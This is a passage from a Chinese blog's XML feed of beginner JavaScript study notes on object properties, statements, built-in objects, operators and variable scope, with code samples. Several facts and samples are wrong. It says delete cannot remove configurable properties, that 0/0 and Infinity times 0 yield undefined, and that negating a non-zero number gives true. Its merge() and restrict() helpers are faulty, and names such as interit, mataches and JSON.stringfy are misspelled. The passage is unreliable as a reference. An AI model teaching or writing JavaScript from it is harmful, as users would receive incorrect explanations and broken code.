当我们通过 [] 来访问对象的属性时，在程序运行是可以设置和修改或者创建它们。 继承对象具有自有属性（own property），也有一些属性是从原型对象上继承来的。 还是这个例子： 123456789101112131415161718function inherit(p)&#123; if (p == null) throw TypeError(); // p 是一个对象 if (Object.create) return Object.create(p); // 如果存在 Object.create，直接使用它来创建 var t = typeof p; // 否则进一步检测 if (t !== "object" &amp;&amp; t !== "function") throw TypeError(); function f() &#123;&#125;; // 创建一个空构造函数 f.prototype = p; // 将其原型属性设置为 p return new f(); // 使用 f() 创建 p 的继承对象&#125;var o = &#123;&#125;;o.x = 1;var p = inherit(o); // p 继承自对象 o 和 Object.prototypep.y = 2;var q = inherit(p); // q 继承自对象 p、 o 和 Object.prototypeq.z = 3;var s = q.toString();console.log(s); // "[object object]"console.log(q.x + q.y + q.z); // 6 属性 x 和 y 分别继承自 o 和 p 属性访问错误 JavaScript 中，属性访问时，并不总是会话或者设置。 在查询不存在的属性时不会报错，而返回 undefined。 内置构造函数的原型是只读的。 删除属性delete 运算符可以删除对象的属性。delete 只是断开属性和宿主对象的联系，而不会操作属性中的属性。 delete 只能删除自有属性，不能删除继承属性。 delete 不能删除可配置属性。 在非严格模式下，删除全局独享的可配置属性时，可以省略对全局对象的引用，直接在 delete 操作符后跟要删除的属性名即可。 在严格模式下，delete x; 报错， delete this.x; 正常运行 属性检测通过 in 运算符、hasOwnProperty()、propertyIsEnumerable() 方法； in 运算符 12var o = &#123;x: 1&#125;;"x" in o; // true "x" 是 o 的属性 hasOwnProperty() 方法 123var o = &#123;x: 1&#125;;o.hasOwnProperty(x); // true "x" 是 o 的自有属性o.hasOwnProperty(constructor); // false constructor 是原型中的属性 propertyIsEnumerable() 方法 12345678910111213function inherit(p)&#123; if (p == null) throw TypeError(); // p 是一个对象 if (Object.create) return Object.create(p); // 如果存在 Object.create，直接使用它来创建 var t = typeof p; // 否则进一步检测 if (t !== "object" &amp;&amp; t !== "function") throw TypeError(); function f() &#123;&#125;; // 创建一个空构造函数 f.prototype = p; // 将其原型属性设置为 p return new f(); // 使用 f() 创建 p 的继承对象&#125;var o = interit(&#123;x: 1&#125;);o.y = 1; o.propertyIsEnumerable("x"); // false "x" 属性是继承的，不能被枚举o.propertyIsEnumerable("y"); // true 除了 in 以外， 另一种简单的判断一个属性是否是 “undefined” 使用 “!==” 1234var o = &#123;x: 1&#125;;o.x !== undefined; // trueo.y !== undefined; // false;o.toString !== undefined; // true 但 in 可以区分不存在的属性和存在但值为 undefined 类型的属性 1234567var o = &#123;x: undefined&#125;;o.x !== undefined; // false 属性存在，但是值为 undefinedo.y !== undefined; // false 属性不存在"x" in o; // true 属性存在"y" in o; // false 属性不存在delete o.x; // 删除了属性 x"x" in o; // false 属性不再存在 对象的枚举属性除了检测对象的属性，我们经常需要遍历对象的属性，通常使用 for-in 遍历; ECMAScript 5 提供了 Object.keys() 方法，返回值是一个数组，这个数组由对象中可枚举的自有属性的名称组成。 ECMASciript 5 提供的另一种枚举属性的方法是 Object.getOwnPropertyNames(), 和 Object.keys() 类似，只是它返回对象的所有自有属性的名称，而不仅仅是可以枚举的属性。 用来枚举对象属性的工具函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273/** * [extend description] 把 P 中的可枚举属性复制到 o 中， * 如果有同名属性，则覆盖 o 中的属性 * @param &#123;[type]&#125; o [description] * @param &#123;[type]&#125; p [description] * @return &#123;[type]&#125; [description] */function extend(o, p) &#123; for (var prop in p) &#123; o[prop] = p [prop]; &#125; return o;&#125;/** * [merge description] 把 P 中的可枚举属性复制到 o 中， * 如果有同名属性, o 中的属性不受影响 * @param &#123;[type]&#125; o [description] * @param &#123;[type]&#125; p [description] * @return &#123;[type]&#125; [description] */function merge (o, p) &#123; for (var prop in p) &#123; if (o.hasOwnProperty[prop]) continue; o[prop] = p [prop]; &#125; return o;&#125;/** * [restrict description] 如果 o 中的属性没有同名属性，则从 o 中删除这个属性 * @param &#123;[type]&#125; o [description] * @param &#123;[type]&#125; p [description] * @return &#123;[type]&#125; [description] 返回 o */function restrict (o, p) &#123; for (var prop in p) &#123; if (!(prop in p)) delete o[prop]; &#125; return o;&#125;/** * [substract description] 如果 o 中存在同名属性，则删除这个属性 * @param &#123;[type]&#125; o [description] * @param &#123;[type]&#125; p [description] * @return &#123;[type]&#125; [description] */function substract(o, p) &#123; for (var prop in p) &#123; delete o[prop]; &#125; return o;&#125;/** * [union description] 如果有重名属性，使用 p 中的属性 * @param &#123;[type]&#125; o [description] * @param &#123;[type]&#125; p [description] * @return &#123;[type]&#125; [description] 返回一个新对象这个对象同时拥有 o 的属性 */function union (o, p) &#123; return extend (extend(&#123;&#125;, o), p);&#125;/** * [keys description] 返回的数组中包含的是 o 中可枚举的自有属性的名字 * @param &#123;[type]&#125; o [description] * @return &#123;[type]&#125; [description] 返回一个数组 */function keys(o) &#123; if (typeof o !== "object") throw TypeError(); var result = []; for (var prop in o)&#123; if (o.hasOwnProperty(prop)) result.push(prop); &#125; return result;&#125; 属性 getter 和 setter当程序执行查询存储属性的值的时候，JavaScript 调用 getter 方法(无参数)，当设置属性值的时候，调用的是 setter 方法。 属性的特性属性包含一个属性名和4个特性： value 属性值 writable 可写性 enumerable 可枚举性 configurable 可配置性存取器属性不具有值 value 和 可写性 ECMAScript 5 中定义了属性描述符 Object.getOwnPropertyDesctiptor() 获取某个对象特定的属性，这个方法只能得到自有属性的特性。 让新建的属性具有某种特性，需要调用 Object.definePeoperty() 方法；传入要修改的对象，要创建或修改的属性的名称以及属性描述符对象； 12345678910111213141516171819202122232425var o = &#123;&#125;; // 创建一个空对象// 插入一个不可枚举的数据属性 x, 并赋值为 1；Object.defineProperty(o, "x", &#123; value: 1, writable: true, enumerable: false, configurable: true&#125;);o.x; // --&gt; 1Object.keys(o); // --&gt; []// 对属性 x 做修改变为只读Object.defineProperty(o, "x", &#123;writable: false&#125;);// 试图更改这个属性值o.x = 2; // 更改操作失败，在严格模式中抛出异常o.x; // =&gt; 1;// 属性依然是可配置的，因此可以通过这种方式对它进行修改Object.defineProperty(o, "x", &#123;value: 2&#125;);o.x; // =&gt; 2// 现在讲 x 从数据属性修改为存储器属性Object.defineProperty(o, "x", &#123; get: function()&#123; return 0; &#125;&#125;);o.x; // =&gt; 0 需要同时修改多个属性，使用 Object.defineProperties(),它返回修改后的对象。 12345678910111213141516171819202122232425/** * 复制属性的特性 * 给 Object.prototype 上添加一个不可枚举的extend() 方法 * 这个方法继承自它的调用对象，将作为参数传入的对象的属性以一幅字 * 除了值之外也赋值属性所有的特性，除非在目标对象中存在同名的属性。 * 参数对象的所有自有属性（包括不可枚举的属性）也会一一复制 */Object.defineProperty(object.prototype, "extend", &#123; // 定义 Object.prototype.extend writable: true, enumerable: false, // 将其定义为不可枚举的 configurable: true, value: function(o)&#123; // 得到所有的自有属性，包括不可枚举属性 var names = Object.getOwnPropertyNames(o); // 遍历它们 for (var i = 0; i &lt; names.length; i++)&#123; // 如果属性已经存在，则跳过 if (names[i] in this) continue; // 获取 o 中的属性描述符 var desc = Object.getOwnPropertyDescriptor(o, names[i]) // 用它给 this 创建一个属性 Object.defineProperty(this, names[i], desc) &#125; &#125;&#125;); 对象的三个属性每一个对象都有与之相关联的原型 (prototype)、类 (class) 和可扩展性 (extensible attribute)。 原型属性通过直接量创建的对象使用 Object.prototype 作为它们的原型，而使用 new 创建的对象使用 构造函数的 prototype 属性作为它们的原型。而通过 Object.create() 创建的对象使用第一个参数作为它们的原型，也可以是 null . ECMAScript 5 中将对象作为参数传入 Object.getPrototypeOf() 方法中可以查询它的原型。 要检测一个对象是否是另一个对象的原型（或处于原型链中），用 isPrototypeOf() 方法。 类属性对象的类属性是一个字符串，用以表示对象的类型信息。只有一种间接的方法可以访问，即toString() 方法。默认的 toString() 方法继承自 Object.prototype，返回 [object class] 格式的字符串。 如何获得对象的类？ 12345678/** * classof() 函数 */function classof(o)&#123; if (o === null ) return "null"; if (o === undefined) return "undefined"; return Object.prototype.toString.call(o).slice(8,-1);&#125; 这个函数可以传入任意的参数。 对象的可扩展性ECMAScript 5 的 Object.preventExtensions() 方法将对象转为不可扩展的，Object.seal() 还可以设置对象的属性不可配置。 序列化对象（JSON 对象表示法）是指将对象的状态转为字符串，也可以将字符串还原为对象。 ECMAScript 5 提供了内置函数 JSON.stringify() 和 JSON.parse() 用来序列化和还原JavaScript对象。这两个方法使用 JSON 数据格式。 JSON, 即 JavaScript Object Notation（ JavaScript 对象表示法）是仿照JS中对象字面量的格式去书写的一串用来记录对象数据的字符串，可以用于数据传输。 即 JSON 注意：函数、RegExp、Error 对象和 undefined 值不能序列化和还原 JSON 转字符串 序列化 JSON.stringfy(); 字符串转 JSON 反序列化 JSON.parse(); 遍历的 JSON 两种方式通过for可以对集合进行有序的遍历for(var k in json) { 语句 }; k变量代表的是json中的各个属性（key）和 var i = 0中的i是一个意思,名字不同而已 对象的方法 toString() 方法 toLocalString() 方法 toJSON() 方法 valueOf() 方法]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js语句]]></title>
    <url>%2F2015%2F06%2F15%2Fjs%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[ECMAScript 语法定义的语句通常使用一个或多个关键字来完成给定的任务。 条件判断结构 if/ if…else/ if…else 嵌套12345if(条件表达式)&#123; // 如果条件表达式为true，执行该处代码&#125;else&#123; // 如果条件表达式为false,执行该处代码&#125; 条件判断的嵌套 123456789if(条件表达式）&#123; //如果条件表达式结果为true,执行该语句，下边语句不执行。&#125;else if(条件表达式)&#123; // 如果条件表达式结果为true,执行该语句，下边语句不执行。&#125;else if(条件表达式)&#123; // 如果条件表达式结果为true,执行该语句，下边语句不执行。&#125;else &#123; // 如果以上语句都为false,执行该语句。&#125; Switch语句写法 123456789101112131415161718var mon=prompt("请输入月份");switch(mon)&#123; case "3": case "4": case "5": alert("春季"); break; case "6": case "7": case "8": alert("夏季"); break; case "9": case "10": case "11": alert("秋季"); break; case "12": case "1": case "2": alert("冬季"); break; default: alert("请输入正确月份"); break;&#125; 注意:switch后边的变量和case后边值的数据类型必须保持一致。 While循环语句语法: 1234var n1;While(条件表达式)&#123; // 循环语句&#125; 如果while后边的条件表达式为true,循环语句一直执行，直到while后边的条件表达式为false, 循环终止（跳出循环）,使用while语句的时候，需在外边定义一个变量。 Do while 语句语法 123do&#123; // 循环语句&#125;while(条件表达式) 先执行do里循环代码，再和while后边的条件表达式进行判断，如果结果为true,继续执行do里的循环，结果为false，循环终止。比while多执行一次循环。 while语句 先判断后执行do while 语句 先执行后判断 for循环语法 123for(var i=1; i&lt;=100; i++)&#123; //循环代码&#125; break语句单独使用 break 语句的作用是立即退出最内层的循环或 switch 语句。 语法： 1234while()&#123; // 循环语句 break;&#125; Break是跳出当前循环体； continue语句跳出循环一次。后边的代码不继续执行。 break 和 continue 的区别 break跳出当前循环，执行循环后的语句 continue跳出当前循环，继续执行循环 for-in 属性枚举语句for-in 语句用来枚举对象的属性。 123for(variable in object)&#123; // 代码段&#125; variable 是一个变量名，也可以是一个可以产生左值表达式或者一个通过 var 语句声明的变量，每次循环都会计算 variable 这个表达式，也就是说每次循环它的值可能不同。for/in 循环并不会遍历对象的所有属性，只有”可枚举”的属性才会遍历到。内置对象的方法就是不可枚举的 label （标签）语句label 语句可以在代码中添加标签，以便将来使用。通过给语句定义标签，就可以在程序的任何地方通过标签名引用这条语句。 123start: for(var i = 0; i &lt; count; i++)&#123; console.log(i);&#125; with 语句with 语句的作用是将作用域设置到一个特定的对象中。如： 123456789var qs = location.search.substring();var hostName = location.hostname();var utl = location.href();// 以上代码可以写成下面的方式, 严格模式下不允许使用 withwith(location)&#123; var qs = search.substring(); var hostName = hostname(); var utl = href();&#125; return 语句函数是一种表达式，所有的表达式都有值。函数中国的 return 语句既是指定函数调用后的返回值。因此，return 语句只能在函数体内部出现，而且 return 语句经常作为函数的最后一条语句出现，但并不是说一定要放在函数体的最后，即使在执行 return 语句的时候还有很多后续代码没有执行，这是函数也还会返回调用程序。 throw 语句异常是指程序在程序在运行时发生的异常情况或错误时产生的一个信号。在 JavaScript 中，当产生运行时错误或者程序使用 throw 语句时就会显式的抛出异常。 try/catch/finally 语句try/catch/finally 是 JavaScript 的异常处理机制。其中 try 从句中定义了需要处理的异常所在代码块，catch 从句跟在 try 后，当 try 块内发生了异常时，调用 catch 内的代码逻辑。catch 从句后跟随 finally 块，后者中国放置清理代码，不管是 try 块中是否产生异常，finally 块内的逻辑总是会执行。 12345678try &#123; // 需要捕获异常的代码块&#125; catch(e) &#123; // try 代码块抛出异常才会执行此代码块中的逻辑 // 还可以通过 throw 语句来再次抛出异常&#125; finally &#123; // 不管异常有没有发生，这个代码块中的逻辑都会执行&#125; 其它语句debugger 语句“use strict”开启 ECMAScript 5 引入的一条命令，开启严格模式。说明后续的所有 JavaScript 代码都在严格模式下执行。 严格模式下禁止使用 with 语句 在严格模式下，所有的变量都要先声明； 严格模式中，调用的函数中的一个 this 值是 undefined ； 可以利用这种方式判断 JavaScript 实现是否支持严格模式 1234var hasStrictMode = (function()&#123; "use strict"; return this === undefined;&#125;()); 在严格模式中，当通过 call() 或 apply() 来调用函数时，其中 this 值就是通过 call() 或 apply() 传入的第一个参数；+（在非严格模式中，null 和 undefined 值被全局对象和转换为对象的费对象值所替代） 在严格模式，给只读属性和给不可扩展的对象创建新成员都抛出一个类型错误异常。+（在非严格模式中，这些操作只是简单地操作失败，不会报错） 在严格模式下，传入 eval() 的代码不能在调用程序锁在的上下文中声明变量或定义函数 在非严格模式中是可以这样做的。 严格模式下，函数里的 arguments 对象拥有传入函数值的静态副本。 严格模式下，delete 运算符后跟随非法的标识符会抛出异常 严格模式下，试图删除一个不可配置的属性将抛出一个类型错误异常 严格模式下，在一个对象直接量中定义两个或多个同名属性将会产生一个语法错误 严格模式下是不允许使用八进制整数直接量 严格模式下标识符 eval() 和 arguments 当做关键字，它们的值是不能更改的。不能给这些标识符赋值。 严格模式中限制了对调用栈的检测能力，在严格模式的函数中，arguments.caller 和 arguments.callee 都会抛出一个类型错误异常。 严格模式的函数同样具有 caller 和 arguments 属性，当访问这两个属性时将会抛出类型错误异常。]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js Date、Math、包装对象、RegExp]]></title>
    <url>%2F2015%2F06%2F08%2Fjs%20Date%E3%80%81Math%E3%80%81%E5%8C%85%E8%A3%85%E5%AF%B9%E8%B1%A1%E3%80%81RegExp%2F</url>
    <content type="text"><![CDATA[javaScript的几个内置对象Date对象ECMAScript 5 提供了两个方法：Date.parase() 和 Date.UTC() 返回日期的毫秒数 12345678var now = new Date(); //创建对象alert(Date()); //返回一个完整的日期时间alert(now.getDate()); //返回从1开始计数的天数alert(now.getDay()); //返回当前周几alert(now.getFullYear()); //返回当前年份alert(now.getMonth()+1); //返回当前月份alert(now.getHours()); //当地时间的小时var then = new Date(2011, 10, 10); // 2011年10月10日 日期格式化方法 toDateString(); toTimeString(); toLocaleDateString(); toLocalTimeString(); toUTCString() Math对象123456789101112131415161718// 控制台输出Math.max(1,2,3,4,5);//这些数字中的最大值Math.min(1,2,3,4,5);//返回多个数中的最小值Math.floor(45.84334);//向下取整Math.ceil(5.4443);//向上取整Math.round(67.55);//四舍五入Math.random();//随机数 0-1 parseInt(Math.random()*10+1); //随机数 1-10parseInt(Math.random()*100+1); //随机数 1-100Math.abs(-100);//返回绝对值 Math.pow(4,3); //4 的 3 次幂 Math.sqrt(16); //开平方Math.sin(4);//返回正弦值Math.PI; // π 圆周率Math.sqrt(3); // 3 的平方根Math.exp(3); // e 的 3 次幂Math.log(10); // 10 的自然对数Math.E; // 自然对数的底数 全局对象当 JavaScript 解释器启动时，它将创建一个新的全局对象，并给它一组定义的初始属性。 全局属性，如 undefined、Infinity 和 NaN; 全局函数，如：isNaN()、parseInt() 和 eval(); 构造函数，如：Date()、RegExp()、String()、Object() 和 Array() 全局对象，如：Math 和 JSON; 包装对象 String() Number() Boolean()字符串字面量、数字字面量、布尔字面量均可以使用”.”符号引用属性值，当属性值是一个函数时，称其为方法。只有对象有属性，JavaScript 在创建字符串、数字、布尔值时会自动的通过调用 new String(); new Number(); new Boolean() 的方式调用。 RegExp 对象var expression = /pattern/flags; pattern 是正则表达式，可以包含字符类，限定符，分组，向前查找以及反向查找。flag是标志，有 3 种： g: 全局(global)模式 i: 表示不区分大小写 m: 表示多行(multiline)模式 RegExp 构造函数的模式参数是字符串，在某些情况下需要双重转义； RegExp 实例属性 global 布尔值，是否设置了 g 标志 ignoreCase 布尔值，是否设置了 i 标志 lastIndex 整数，表示开始搜索下一个匹配项的字符位置，从 0 算起 multiline 布尔值，是否设置了 m 标志 source 正则表达式的字符串表示，按照字面量形式而非传入构造函数中的字符串模式返回； RegExp 实例方法 exec() ； 接收一个参数，要引用匹配模式的字符串，返回包含第一个匹配项信息的数组； 没有匹配项的情况下返回 null 返回的数组虽然是 Array 的实例，但包含两个属性：index 和 input index 表示匹配项子在字符串中的位置 input 表示应用正则表达式的字符串 exec() 方法在设置了全局标志的情况下，每次调用该方法都会在字符串中继续查找新匹配项。 12345678var text = "mom and dad and baby";var pattern = /mom( and dad( and baby)?)?/gi;var mataches = pattern.exec(text);console.log(matches.index); // 0console.log(matches.input); // "mom and dad and baby"console.log(matches[0]); // "mom and dad and baby"console.log(matches[1]); // " and dad and baby"console.log(matches[2]); // " and baby" 总之：正则分组之后匹配到的结果如果匹配成功则会得到数组，数组中第 0 项是与整个模式匹配的字符串，从第一项开始就是数正则表达式中的左括号就可以了，左括号是第几个，则解析出来的数据就是数组中下标为该数字的元素`]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js表达式和运算符]]></title>
    <url>%2F2015%2F06%2F06%2Fjs%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%92%8C%E8%BF%90%E7%AE%97%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[JavaScript 解释器会将表达式计算出一个结果，程序中最常见的变量就是一种表达式。变量名也是一种表达式。复杂表达式是由简单表达式组成的，最常用的方法是使用运算符。 表达式原始表达式原始表达式是表达式的最小单位，通常包含： 常量 直接量 关键字 变量 对象和数组的初始化表达式 数组表达式 [] [1+2,3+1] var matrix = [[1,2,3],[1,2,2],[2,3,1]]; [0,,,1] 对象表达式 var p = {name: &quot;Hiraku&quot;, age: 17}; var q = {}; q.x = 2.3 var data = {casData:{cas: canvas, ctx: context}, lineData{lineStyle:&quot;red&quot;,lineWidth:2}} 函数定义表达式 var square = function(x){ return x * x}; 访问对象属性的方式 obj.key; obj[key]; 调用表达式: 函数表达式开始，这个函数表达式指代了要调用的函数，函数表达式后是一对圆括号，括号内是以逗号隔开的参数； f(0); Math.max(1,2,3); 对象创建表达式 new Object() new Point(1,3) 无参数时()可以省略： new Object 运算符ECMAScript 描述了一组用于操作数组的操作符，分为算术操作符、位操作符、关系操作符合相等操作符。对于对象，相应的操作符通常都会调用对象的 valueOf() 方法或者 toString() 方法。 比较、typeof、+、-、*、/、%、=、==、===、三元、逻辑运算符 比较运算符 &lt; = &lt;= != 判断数据类型 typeof(变量名); 算术运算符 加运算： 两个数据类型都为数字类型变量相加，得到的是数字类型。 一个为数字类型的变量和一个为字符串类型的变量相加，得到的是一个字符串类型，加号起一个连接的作用。 减运算 如果两个变量都为数字类型相减，得到的是数字类型。 如果一个为数字类型的变量，一个为数字字符串，相减得到的是数字类型。 如果一个为数字类型的变量，一个为非数字字符串，相减得到的NaN,数字类型。 * 乘运算 Inifinity 与 0 相乘， undefined。 / 除运算 两个都为数字类型的变量，相除得到的是数字类型。 如果一个为数字类型的变量，一个为数字字符串变量，相除得到的是数字类型。 如果一个为数字类型的变量，一个为非数字字符串，相除得到的NaN,数字类型。 如果0作为除数，得到的是infinity(无限大)，是一个数字类型。 0 / 0 是 undefined。 Infinity / Infinity 结果是 NaN。 % 取余数 ()优先级 先计算()括号里边的值。 等号运算符 “=” 赋值预算符 “==” 比较运算符: 只判断内容是否相同，不判断数据类型。 “===” 比较运算符: 不仅判断内容是否相同，还判断数据类型是否相同。 “!=” 不等于: 只判断内容是否不相同，不判断数据类型。 “!==” 不等于: 不仅判断内容是否不相同，还判断数据类型是否相同。 三元运算符 语法： 表达式？如果表达式的值为true,执行表达式后边的代码，如果值为false,执行冒号后边的值。 三元运算符可以理解为if..else的另外一种写法。 逻辑运算符：逻辑运算的前提是参与运算的变量结果为Boolean类型。 或（||） 参与运算，只要满足一个为true,或运算最后的值为true. 参与运算的值都为false,或运算最后的值为false. 且（&amp;&amp;） 参与运算，只要满足一个为false,或运算最后的值为false. 参与运算，都为true的时候，且运算最后的值为true. 非（!） 如果运算结果为true,非运算结果为false 如果运算结果为false,非运算结果为true. 非 如果操作数是一个对象，返回 false 如果操作数是一个空字符串，返回 true 如果操作数是一个非空字符串，返回 false 如果操作数是数值 0 ，返回 true 如果操作数是任意非 0 数值，包括 Infinity ，返回 true 如果操作数是 null ，返回 true 如果操作数是 NaN ，返回 true 如果操作数是 undefined ，返回 true与 如果第一个操作数是对象，返回第二个操作数； 如果第二个操作数是对象，只有第二个数求值结果为 true 是，返回该对象 如果两个都是对象，返回第二个； 如果有一个操作数是 null ，返回 null 如果有一个操作数是 NaN ，返回 NaN 如果有一个操作数是 undefined ，返回 undefined或 如果第一个操作数是对象，返回第一个； 如果第一个操作数求值结果 false ，返回第二个 如果两个都是对象，返回第一个； 如果两个操作数是 null ，返回 null 如果两个操作数是 NaN ，返回 NaN 如果两个操作数是 undefined ，返回 undefined 总结逻辑运算符： &amp;&amp;和||都采取短路运算，即第一个能够决定结果就不再看第二个了 &amp;&amp; 的要求比较宽松 要两个都是true才是true 所以看到第一个是false就没有必要继续完后看了 || 的要求比较严格，要两个都是false才是false，所以看到第一个是true就没有必要继续完后看了 &amp;&amp;和||不但可以操作布尔类型的值，对其他类型的值也可以进行操作，并返回可以决定表达式结果的那个值。 自增自减 ++i，i++ 在没有参加运算的情况下，++i i++都是在变量的基础上加1。 在参加运算的情况下： 123var n1=123;var n2=n1++; // 先把n1的值赋给n2,然后n1执行加1的操作。Var n2=++n1; // 先执行n1加1的操作，再赋值给n2. 总的来说： 递增++ 递减– a++ 先参与运算 后自加 ++a 先自加 后参与运算 注意： 在应用于一个包含有效数字字符串是，先将其转换为数字值再执行加减1的操作。 在应用于一个不包含有效数字字符的字符串时，将变量的值设置为 NaN。 在应用于布尔值 false 时，先将其转换为 0 再执行加减 1 的操作。 在应用于布尔值 true 时，先将其转换为 1 再执行加减 1 的操作。 在应用于对象时，先抵用对象的 valueOf 方法以取得一个可供操作的值，然后对该值应用前面的规则。如果结果是NaN，则调用 toString() 方法后再应用前述的规则。 带操作的赋值运算符 位操作符0 正 1 负，最高位表示符号位。正数和负数都是以二进制码来存储，但负数使用的格式是二进制补码。计算过程如下： 求这个数绝对值的二进制码； 求二进制反码； 得到的反码加 1。ECMAScript 中，对 NaN, Infinity 值应用位操作时，这两个值都当做 0 来处理。 按位非(~) 按位与(&amp;) 按位或(|) 按位异或(^) 左移(&lt;&lt;) 有符号右移(&gt;&gt;) 无符号右移(&gt;&gt;&gt;) instanceof 操作符测试对象类，左操作数是一个对象，右操作数是标识对象的类。如果左侧的对象是右侧类的实例，则表达式返回true，否则返回false。 操作符优先级 eval()eval() 是一个函数，但它已经被当做运算符来对待了。 eval()eval() 只有一个参数。如果传入的不是字符串，直接返回这个参数，如果是字符串，会把字符串当成 JavaScript 代码进行编译，如果便以失败抛出异常，编译成功则执行这段代码。返回字符串中最后一个表达式或语句的值，如果最后一个表达式中没有返回值，则返回 undefined。 eval() 它使用了调用它的变量作用域环境。它查找变量的值和定义新变量和函数的操作和局部作用域中的代码完全一样。 全局的eval()eval() 具有改变局部变量的能力。当直接使用 “eval” 名称来调用 eval() 函数时，通常称为”直接 eval”.直接调用 eval() 时，它总是调用它的上下文作用域内执行。其它间接调用使用全局对象作为其上下文作用域，并且无法读、写、定义局部变量和函数。 1234567891011121314var geval = eval;var x = "global", y = "global";function f()&#123; var x = "local"; eval ("x += 'changed'"); return x;&#125;function g()&#123; var y = "local"; geval ("y += 'changed'"); return y;&#125;console.log(f(),x);console.log(g(),y); 严格的eval()ECMAScript 5 严格模式中，eval() 是私有上下文环境中的局部 eval()，eval() 执行的代码段可以查询或更改局部变量，但不能在局部作用域中定义新变量。 eval总结 函数是封装了一段可以重复执行的代码 eval方法的功能：执行一段JS代码(封装了代码) 在eval方法中没有作用域的概念（ES5严格模式有了独立的作用域）——&gt;声明的变量都是全局变量，函数都是全局函数 eval和函数的比较 eval封装了一段代码（只能执行一次）；函数封装了一段代码（可以重复执行） eval中没有独立作用域的——&gt;声明的变量和函数都是全局的； 函数中是有独立作用域 ——&gt;函数内声明的变量和函数只能在当前函数内部所访问 delete运算符delete 运算符时一元运算符，用来删除对象属性或者数组元素。删除属性或者删除数组元素不仅仅是设置了一个 undefined 的值。当删除一个属性时，这个属性将不再存在。读取一个不存在的属性将返回 undefined，但是可以通过 in 运算符来检测这个属性是否在对象中存在。 void运算符void 运算符是一元运算符，在操作数之前，操作数可以使任意类型。通常用在客户端的URL–javascript: URL 中，在 URL 中可以写带有副作用的表达式，而 void 则让浏览器不比显示这个表达式的计算结果。 例如： 1&lt;a href="javascript:void window.open();"&gt;打开一个新窗口&lt;/a&gt; 通过给 &lt;a&gt; 标签的onclick 绑定一个事件处理程序要比在 href 中写 “javascript:URL” 要更加清晰，这种情况下 void 可有可无。 逗号运算符逗号运算符是二元操作符，操作数可以是任意类型，先计算左边操作数后计算右边操作数，最后返回右操作数的值。]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js变量和数据类型]]></title>
    <url>%2F2015%2F06%2F03%2Fjs%E5%8F%98%E9%87%8F%E5%92%8C%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[变量JavaScript是弱类型的语言，变量是松散的。所谓松散是可以保存任何类型的变量。即声明不同数据类型的变量使用同一个关键字 var，变量就是变化的量，变量的作用就是用来装数据的容器。声明变量的时候不用考虑类型，但是处理和计算的时候要考虑类型. 定义变量定义变量使用关键字 var来定义变量名。 1234// 在全局作用域下声明了变量 avar a; // 使用赋值运算符来给变量赋值a = "a此时是字符串"; 赋值： 赋值运算符为“=”，这个等号不用判断两者是否相同。 如果判断是否相同，可使用==（===）。 以上两步可简写为： 1var a = "a此时是字符串"; 注意： 123function foo()&#123; msg = "我是函数内部定义的全局变量";&#125; 上面例子省略了var操作符， msg 就变成了全局变量，函数外部也能访问到，但不要这样做！。 变量命名规范 由字母、数字、下划线、$ 组成且开头不能是数字定义变量名。 不能使用特殊符号或者特殊符号开头来定义变量名（_除外）。 不能以关键字来定义变量名 变量的名称要有实际意义 规则中所说的字母包括ASCII和Unicode字母字符，如汉字，但不推荐使用 变量的命名遵守驼峰命名法，首字母小写,第二个单词的首字母大写 例如：userName 关键字 1234567break do instanceof typeofcase else new varcatch finally return voidcontinue for switch whiledebugger* function this withdefault if throwdelete in try 不能使用保留字来定义变量名 (保留字) 12345678abstract enum int shortboolean export interface staticbyte extends long superchar final native synchronizedclass float package throwsconst goto private transientdebugger implements protected volatiledouble import public 注意：在JS中，是严格区分大小写的。 执行环境和作用域执行环境是 JavaScript 中最为重要的一个概念。定义了变量或函数有权访问其它数据。每个环境中都有一个与之关联的变量对象，我们编写的代码无法访问，但是环境中定义的变量存放在这个对象中。 全局执行环境是最外围的一个执行环境。根据 ECMAScript 实现所在的宿主环境的不同，表示执行环境的对象也不一样。在 web 浏览器中，全局执行环境被认为是 window 对象，因此所有的全局变量和函数都是作为 window 对象的属性和方法创建的。某个环境中的代码全部执行完，该环境中的变量被销毁，保存在其中的所有的变量和函数定义也随之销毁。全局执行环境直到应用程序退出才销毁。 每个函数都有自己的执行环境。当代码在一个环境中执行时，会创建作用域链。作用域链式保证对执行环境有权访问的所有变量和函数的有序访问。作用域的前端始终都是当前执行的代码所在环境的变量对象。如果这个环境是函数，则将其活动对象作为变量对象。活动对象在最开始的时候只包含一个变量，即 arguments 对象。作用域中的下一个变量对象来说包含（外部的环境），而再下一个变量对象则来自下一个包含环境。这样，一直延续到全局执行环境，全局执行环境的变量对象始终都是作用域链中的最后一个对象。 一个变量的作用域是程序源代码中定义这个变量的区域。全局变量拥有全局作用域，在 JavaScript 代码中任何地方都是有定义的。而在函数内部声明的变量只有在函数体内有定义，它们是局部变量，作用域是局部的。 在函数体内部，局部变量的优先级高于同名的全局变量。 函数作用域和声明提前块级作用域是指在一对花括号内的代码都具有各自的作用域，而且变量在声明它们的代码之外是不可见的。但是 JavaScript 没有块级作用域的概念。而是使用了函数作用域。JavaScript 的函数作用域是指函数内声明的所有变量在函数体内始终是可见的。 1234567891011function test(o)&#123; var i = 0; // i 在整个函数体内部有定义 if (typeof o == 'object')&#123; var j = 0; // j 在函数体内有定义 for(var k = 0; k &lt; 10; k++)&#123; // k 在函数体内是有定义的，不仅仅是在循环内 console.log(k); // 输出 0~9 &#125; console.log(k); // 输出 10 &#125; console.log(j); // j 已经定义了，但是可能没有初始化&#125; 作为属性的变量当声明一个变量时，实际上是定义了一个全局对象的一个属性，当使用 var 声明变量时，创建的这个对象是不可配置的，也就是说这个变量不能通过 delete 操作符来删除。如果在非严格模式下，给一个未声明的全局变量赋值的话， JavaScript 